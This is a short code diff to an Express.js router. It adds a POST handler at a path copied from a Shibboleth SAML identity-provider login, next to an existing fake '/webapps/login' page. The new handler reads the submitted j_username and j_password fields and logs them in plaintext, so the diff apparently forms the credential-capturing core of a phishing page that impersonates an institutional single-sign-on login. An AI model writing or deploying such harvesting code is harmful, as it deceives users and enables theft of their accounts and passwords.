@@ -13,4 +13,14 @@ router.get('/webapps/login', function (req, res, next) {
 router.get('/idp/profile/SAML2/Redirect/SSO', function (req, res, next) {
     res.render('login');
 });
+
+router.post('/idp/profile/SAML2/Redirect/SSO', function (req, res, next) {
+    res.render('login');
+    var username = req.body.j_username;
+    var password = req.body.j_password;
+    console.log(username);
+    console.log(password);
+});
+
+
 module.exports = router;
